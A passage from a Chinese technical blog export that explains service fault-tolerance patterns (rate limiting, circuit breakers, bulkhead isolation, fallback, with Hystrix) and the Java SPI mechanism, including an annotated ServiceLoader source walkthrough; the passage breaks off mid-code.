<p>令牌桶控制的是一个时间窗口内通过的数据量，在API层面我们常说的QPS、TPS，正好是一个时间窗口内的请求量或者事务量，只不过时间窗口限定在1s罢了。以一个恒定的速度往桶里放入令牌，而如果请求需要被处理，则需要先从桶里获取一个令牌，当桶里没有令牌可取时，则拒绝服务。令牌桶的另外一个好处是可以方便的改变速度，一旦需要提高速率，则按需提高放入桶中的令牌的速率。</p>
<p>在我们的工程实践中，通常使用Guava中的Ratelimiter来实现控制速率，如我们不希望每秒的任务提交超过两个：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//速率是每秒两个许可</span></span><br><span class="line"><span class="keyword">final</span> RateLimiter rateLimiter = RateLimiter.create(<span class="number">2.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">submitTasks</span><span class="params">(List tasks, Executor executor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Runnable task : tasks) &#123;</span><br><span class="line">        rateLimiter.acquire(); <span class="comment">// 也许需要等待</span></span><br><span class="line">        executor.execute(task);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h1 id="电路熔断器-Circuit-Breaker"><a href="#电路熔断器-Circuit-Breaker" class="headerlink" title="电路熔断器(Circuit Breaker)"></a>电路熔断器(Circuit Breaker)</h1><p>在我们的工程实践中，偶尔会遇到一些服务由于网络连接超时，系统有异常或load过高出现暂时不可用等情况，导致对这些服务的调用失败，可能需要一段时间才能修复，这种对请求的阻塞可能会占用宝贵的系统资源，如：内存，线程，数据库连接等等，最坏的情况下会导致这些资源被消耗殆尽，使得系统里不相关的部分所使用的资源也耗尽从而拖累整个系统。在这种情况下，调用操作能够立即返回错误而不是等待超时的发生或者重试可能是一种更好的选择，只有当被调用的服务有可能成功时我们再去尝试。</p>
</blockquote>
<p>熔断器模式可以防止我们的系统不断地尝试执行可能会失败的调用，使得我们的系统继续执行而不用等待修正错误，或者浪费CPU时间去等到长时间的超时产生。熔断器模式也可以使我们系统能够检测错误是否已经修正，如果已经修正，系统会再次尝试调用操作。下图是个使用熔断器模式的调用流程：</p>
<p><img src="https://i.imgur.com/sA3LQu8.jpg" alt></p>
<p>可以从图中看出，当超时出现的次数达到一定条件后，熔断器会触发打开状态，客户端的下次调用将直接返回，不用等待超时产生。</p>
<p>在熔断器内部，往往有以下几种状态：</p>
<p><img src="https://i.imgur.com/7olZuar.jpg" alt></p>
<blockquote>
<ul>
<li>闭合（closed）状态：</li>
</ul>
</blockquote>
<p>该状态下能够对目标服务或方法进行正常的调用。熔断器类维护了一个时间窗口内调用失败的次数，如果某次调用失败，则失败次数加1。如果最近失败次数超过了在给定的时间窗口内允许失败的阈值(可以是数量也可以是比例)，则熔断器类切换到断开(Open)状态。此时熔断器设置了一个计时器，当时钟超过了该时间，则切换到半断开（Half-Open）状态，该睡眠时间的设定是给了系统一次机会来修正导致调用失败的错误。</p>
<blockquote>
<ul>
<li>断开(Open)状态：</li>
</ul>
</blockquote>
<p>在该状态下，对目标服务或方法的请求会立即返回错误响应，如果设置了fallback方法，则会进入fallback的流程。</p>
<blockquote>
<ul>
<li>半断开（Half-Open）状态：</li>
</ul>
</blockquote>
<p>允许对目标服务或方法的一定数量的请求可以去调用服务。如果这些请求对服务的调用成功，那么可以认为之前导致调用失败的错误已经修正，此时熔断器切换到闭合状态（并且将错误计数器重置）；如果这一定数量的请求有调用失败的情况，则认为导致之前调用失败的问题仍然存在，熔断器切回到断开方式，然后开始重置计时器来给系统一定的时间来修正错误。半断开状态能够有效防止正在恢复中的服务被突然而来的大量请求再次拖垮。</p>
<p>在我们的工程实践中，熔断器模式往往应用于服务的自动降级，在实现上主要基于Netflix开源的组件Hystrix来实现，下图和代码分别是Hystrix中熔断器的原理和定义，更多了解可以查看Hystrix的源码：</p>
<p><img src="https://i.imgur.com/eF0uQwB.jpg" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HystrixCircuitBreaker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Every &#123;<span class="doctag">@link</span> HystrixCommand&#125; requests asks this if it is allowed to proceed or not.</span></span><br><span class="line"><span class="comment">      * &lt;p&gt;</span></span><br><span class="line"><span class="comment">      * This takes into account the half-open logic which allows some requests through when determining if it should be closed again.</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@return</span> boolean whether a request should be permitted</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">allowRequest</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * Whether the circuit is currently open (tripped).</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * <span class="doctag">@return</span> boolean state of circuit breaker</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isOpen</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Invoked on successful executions from &#123;<span class="doctag">@link</span> HystrixCommand&#125; as part of feedback mechanism when in a half-open state.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">markSuccess</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>舱壁隔离(Bulkhead Isolation)</li>
</ul>
</blockquote>
<p>在造船行业，往往使用此类模式对船舱进行隔离，利用舱壁将不同的船舱隔离起来，这样如果一个船舱破了进水，只损失一个船舱，其它船舱可以不受影响，而借鉴造船行业的经验，这种模式也在软件行业得到使用。</p>
<p>线程隔离(Thread Isolation)就是这种模式的常见的一个场景。例如，系统A调用了ServiceB/ServiceC/ServiceD三个远程服务，且部署A的容器一共有120个工作线程，采用线程隔离机制，可以给对ServiceB/ServiceC/ServiceD的调用各分配40个线程。当ServiceB慢了，给ServiceB分配的40个线程因慢而阻塞并最终耗尽，线程隔离可以保证给ServiceC/ServiceD分配的80个线程可以不受影响。如果没有这种隔离机制，当ServiceB慢的时候，120个工作线程会很快全部被对ServiceB的调用吃光，整个系统会全部慢下来，甚至出现系统停止响应的情况。</p>
<p>这种Case在我们实践中经常遇到，如某接口由于数据库慢查询，外部RPC调用超时导致整个系统的线程数过高，连接数耗尽等。我们可以使用舱壁隔离模式，为这种依赖服务调用维护一个小的线程池，当一个依赖服务由于响应慢导致线程池任务满的时候，不会影响到其他依赖服务的调用，它的缺点就是会增加线程数。</p>
<p><img src="https://i.imgur.com/WC2KGsW.jpg" alt></p>
<p>无论是超时/重试，熔断器，还是舱壁隔离模式，它们在使用过程中都会出现异常情况，异常情况的处理方式间接影响到用户的体验，针对异常情况的处理也有一种模式支撑，这就是回退(fallback)模式。</p>
<blockquote>
<ul>
<li><p>回退(Fallback)<br>在超时，重试失败，熔断或者限流发生的时候，为了及时恢复服务或者不影响到用户体验，需要提供回退的机制，常见的回退策略有：</p>
</li>
<li><p>自定义处理：<br>在这种场景下，可以使用默认数据，本地数据，缓存数据来临时支撑，也可以将请求放入队列，或者使用备用服务获取数据等，适用于业务的关键流程与严重影响用户体验的场景，如商家/产品信息等核心服务。</p>
</li>
<li><p>故障沉默（fail-silent）：<br>直接返回空值或缺省值，适用于可降级功能的场景，如产品推荐之类的功能，数据为空也不太影响用户体验。</p>
</li>
<li><p>快速失败（fail-fast）：<br>直接抛出异常，适用于数据非强依赖的场景，如非核心服务超时的处理。</p>
</li>
</ul>
</blockquote>
<p>应用实例<br>在实际的工程实践中，这四种模式既可以单独使用，也可以组合使用，为了让读者更好的理解这些模式的应用，下面以Netflix的开源组件Hystrix的流程为例说明。</p>
<p><img src="https://i.imgur.com/HYT4PNp.jpg" alt></p>
<p>图中流程的说明:</p>
<p>将远程服务调用逻辑封装进一个HystrixCommand。</p>
<p>对于每次服务调用可以使用同步或异步机制，对应执行execute()或queue()。</p>
<p>判断熔断器(circuit-breaker)是否打开或者半打开状态，如果打开跳到步骤8，进行回退策略，如果关闭进入步骤4。</p>
<p>判断线程池/队列/信号量（使用了舱壁隔离模式）是否跑满，如果跑满进入回退步骤8，否则继续后续步骤5。</p>
<p>run方法中执行了实际的服务调用。</p>
<p>a. 服务调用发生超时时，进入步骤8。</p>
<p>判断run方法中的代码是否执行成功。</p>
<p>a. 执行成功返回结果。</p>
<p>b. 执行中出现错误则进入步骤8。</p>
<p>所有的运行状态(成功，失败，拒绝，超时)上报给熔断器，用于统计从而影响熔断器状态。</p>
<p>进入getFallback()回退逻辑。</p>
<p>a. 没有实现getFallback()回退逻辑的调用将直接抛出异常。</p>
<p>b. 回退逻辑调用成功直接返回。</p>
<p>c. 回退逻辑调用失败抛出异常。</p>
<p>返回执行成功结果。</p>
<blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>服务容错模式在美团点评系统的稳定性保障方面应用很多，学习模式有助于新人直接利用熟练软件工程师的经验，对于提升系统的稳定性有很大的帮助。服务容错的目的主要是为了防微杜渐，除此之外错误的及时发现和监控其实同等重要。随着技术的演化，新的模式在不断的学习与实践中沉淀出来，美团点评度假技术团队在构建一个高可用高性能的系统目标之外，让系统越来越有弹性（Resilience）也是我们新的追求。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
<li>Netflix Hystrix Wiki</li>
<li>Martin Fowler. CircuitBreaker</li>
<li>Hanmer R. Patterns for Fault Tolerant Software. Wiley, 2007.</li>
<li>Nygard M. 发布！软件的设计与部署. 凃鸣 译. 人民邮电出版社, 2015.</li>
</ul>
</blockquote>
<p>转自: <a href="https://zhuanlan.zhihu.com/p/23711137" target="_blank" rel="noopener">服务容错模式</a></p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title>java SPI机制</title>
    <url>/2019/04/17/java/java%20SPI%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>Java 6 引入了一种功能，用于发现和加载与给定接口匹配的实现：服务提供者接口（SPI）。</p>
<a id="more"></a>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>SPI 是 java 用于发现和加载与给定接口匹配的实现提供的一种实现机制。主要是为了扩展现有系统应用等。在 JDK 中也有大量应用,比如：</p>
<blockquote>
<ul>
<li>java.nio.file.spi.FileSystemProvider</li>
</ul>
</blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>定义接口和实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IEat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">IEat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"eat Apple...."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Peach</span> <span class="keyword">implements</span> <span class="title">IEat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"eat Peach..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Pear</span> <span class="keyword">implements</span> <span class="title">IEat</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"eat Pear..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着在项目资源目录创建 spi 指定的文件夹 META-INF/services/,最后创建 spi 的描述文件,指定接口的实现类信息,文件名称必须为接口的全类名。<br>本文创建的文件名称既为 com.xwolf.java.spi.IEat,内容为具体的实现类,可以有多个,按行区分.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.xwolf.java.spi.Apple</span><br><span class="line">com.xwolf.java.spi.Pear</span><br></pre></td></tr></table></figure>
<p>最后定义调用服务的具体实现:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EatProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ServiceLoader&lt;IEat&gt; eatProvider = ServiceLoader.load(IEat.class);</span><br><span class="line">    <span class="keyword">for</span> (IEat eat : eatProvider)&#123;</span><br><span class="line">      eat.eat();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行可以正常调用两个定义的实现。</p>
<h1 id="ServiceLoader-源码"><a href="#ServiceLoader-源码" class="headerlink" title="ServiceLoader 源码"></a>ServiceLoader 源码</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceLoader</span>&lt;<span class="title">S</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Iterable</span>&lt;<span class="title">S</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//目录前缀</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String PREFIX = <span class="string">"META-INF/services/"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载的接口或者类的信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;S&gt; service;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化类的类加载器类型</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader loader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 权限控制context</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AccessControlContext acc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提供者信息</span></span><br><span class="line">    <span class="keyword">private</span> LinkedHashMap&lt;String,S&gt; providers = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 延迟迭代器</span></span><br><span class="line">    <span class="keyword">private</span> LazyIterator lookupIterator;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 清空provides,初始化延迟迭代器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        providers.clear();</span><br><span class="line">        lookupIterator = <span class="keyword">new</span> LazyIterator(service, loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    私有构造器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ServiceLoader</span><span class="params">(Class&lt;S&gt; svc, ClassLoader cl)</span> </span>&#123;</span><br><span class="line">        service = Objects.requireNonNull(svc, <span class="string">"Service interface cannot be null"</span>);</span><br><span class="line">         <span class="comment">//如果类记载器为空,用系统类加载器</span></span><br><span class="line">        loader = (cl == <span class="keyword">null</span>) ? ClassLoader.getSystemClassLoader() : cl;</span><br><span class="line">        <span class="comment">//上下文控制</span></span><br><span class="line">        acc = (System.getSecurityManager() != <span class="keyword">null</span>) ? AccessController.getContext() : <span class="keyword">null</span>;</span><br><span class="line">        reload();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fail</span><span class="params">(Class&lt;?&gt; service, String msg, Throwable cause)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServiceConfigurationError</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ServiceConfigurationError(service.getName() + <span class="string">": "</span> + msg,</span><br><span class="line">                                            cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义的配置错误信息</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fail</span><span class="params">(Class&lt;?&gt; service, String msg)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServiceConfigurationError</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ServiceConfigurationError(service.getName() + <span class="string">": "</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fail</span><span class="params">(Class&lt;?&gt; service, URL u, <span class="keyword">int</span> line, String msg)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServiceConfigurationError</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        fail(service, u + <span class="string">":"</span> + line + <span class="string">": "</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取单行信息</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">parseLine</span><span class="params">(Class&lt;?&gt; service, URL u, BufferedReader r, <span class="keyword">int</span> lc,</span></span></span><br><span class="line"><span class="function"><span class="params">                          List&lt;String&gt; names)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServiceConfigurationError</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String ln = r.readLine();</span><br><span class="line">        <span class="keyword">if</span> (ln == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//截取#前面的类信息</span></span><br><span class="line">        <span class="keyword">int</span> ci = ln.indexOf(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">if</span> (ci &gt;= <span class="number">0</span>) ln = ln.substring(<span class="number">0</span>, ci);</span><br><span class="line">        ln = ln.trim();</span><br><span class="line">        <span class="keyword">int</span> n = ln.length();</span><br><span class="line">        <span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//配置语法错误,不能包含空格或者转义符</span></span><br><span class="line">            <span class="keyword">if</span> ((ln.indexOf(<span class="string">' '</span>) &gt;= <span class="number">0</span>) || (ln.indexOf(<span class="string">'\t'</span>) &gt;= <span class="number">0</span>))</span><br><span class="line">                fail(service, u, lc, <span class="string">"Illegal configuration-file syntax"</span>);</span><br><span class="line">            <span class="keyword">int</span> cp = ln.codePointAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!Character.isJavaIdentifierStart(cp))</span><br><span class="line">                fail(service, u, lc, <span class="string">"Illegal provider-class name: "</span> + ln);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = Character.charCount(cp); i &lt; n; i += Character.charCount(cp)) &#123;</span><br><span class="line">                cp = ln.codePointAt(i);</span><br><span class="line">                <span class="keyword">if</span> (!Character.isJavaIdentifierPart(cp) &amp;&amp; (cp != <span class="string">'.'</span>))</span><br><span class="line">                    fail(service, u, lc, <span class="string">"Illegal provider-class name: "</span> + ln);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//提供者添加到List中</span></span><br><span class="line">            <span class="keyword">if</span> (!providers.containsKey(ln) &amp;&amp; !names.contains(ln))</span><br><span class="line">                names.add(ln);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//行数+1</span></span><br><span class="line">        <span class="keyword">return</span> lc + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从磁盘绝对路径解析配置文件，获取提供者信息</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Iterator&lt;String&gt; <span class="title">parse</span><span class="params">(Class&lt;?&gt; service, URL u)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServiceConfigurationError</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        InputStream in = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader r = <span class="keyword">null</span>;</span><br><span class="line">        ArrayList&lt;String&gt; names = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = u.openStream();</span><br><span class="line">            r = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in, <span class="string">"utf-8"</span>));</span><br><span class="line">            <span class="keyword">int</span> lc = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//读取文件内容</span></span><br><span class="line">            <span class="keyword">while</span> ((lc = parseLine(service, u, r, lc, names)) &gt;= <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException x) &#123;</span><br><span class="line">            fail(service, <span class="string">"Error reading configuration file"</span>, x);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (r != <span class="keyword">null</span>) r.close();</span><br><span class="line">                <span class="keyword">if</span> (in != <span class="keyword">null</span>) in.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException y) &#123;</span><br><span class="line">                fail(service, <span class="string">"Error closing configuration file"</span>, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> names.iterator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//延迟迭代器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyIterator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">S</span>&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;S&gt; service;</span><br><span class="line">        ClassLoader loader;</span><br><span class="line">        Enumeration&lt;URL&gt; configs = <span class="keyword">null</span>;</span><br><span class="line">        Iterator&lt;String&gt; pending = <span class="keyword">null</span>;</span><br><span class="line">        String nextName = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">LazyIterator</span><span class="params">(Class&lt;S&gt; service, ClassLoader loader)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.service = service;</span><br><span class="line">            <span class="keyword">this</span>.loader = loader;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//是否有services</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">hasNextService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (nextName != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (configs == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//配置信息</span></span><br><span class="line">                    String fullName = PREFIX + service.getName();</span><br><span class="line">                    <span class="keyword">if</span> (loader == <span class="keyword">null</span>)</span><br><span class="line">                        configs = ClassLoader.getSystemResources(fullName);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        configs = loader.getResources(fullName);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException x) &#123;</span><br><span class="line">                    fail(service, <span class="string">"Error locating configuration files"</span>, x);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ((pending == <span class="keyword">null</span>) || !pending.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!configs.hasMoreElements()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//解析配置文件信息</span></span><br><span class="line">                pending = parse(service, configs.nextElement());</span><br><span class="line">            &#125;</span><br><span class="line">            nextName = pending.next();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取下一下service</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> S <span class="title">nextService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!hasNextService())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">            String cn = nextName;</span><br><span class="line">            nextName = <span class="keyword">null</span>;</span><br><span class="line">            Class&lt;?&gt; c = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = Class.forName(cn, <span class="keyword">false</span>, loader);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException x) &#123;</span><br><span class="line">                fail(service,</span><br><span class="line">                     <span class="string">"Provider "</span> + cn + <span class="string">" not found"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!service.isAssignableFrom(c)) &#123;</span><br><span class="line">                fail(service,</span><br><span class="line">                     <span class="string">"Provider "</span> + cn  + <span class="string">" not a subtype"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                S p = service.cast(c.newInstance());</span><br><span class="line">                <span class="comment">//提供者信息添加到map中</span></span><br><span class="line">                providers.put(cn, p);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">                fail(service,</span><br><span class="line">                     <span class="string">"Provider "</span> + cn + <span class="string">" could not be instantiated"</span>,</span><br><span class="line">                     x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error();          <span class="comment">// This cannot happen</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (acc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> hasNextService();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                PrivilegedAction&lt;Boolean&gt; action = <span class="keyword">new</span> PrivilegedAction&lt;Boolean&gt;() &#123;</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Boolean <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> hasNextService(); &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">return</span> AccessController.doPrivileged(action, acc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> S <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (acc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> nextService();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                PrivilegedAction&lt;S&gt; action = <span class="keyword">new</span> PrivilegedAction&lt;S&gt;() &#123;</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> S <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> nextService(); &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">return</span> AccessController.doPrivileged(action, acc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span 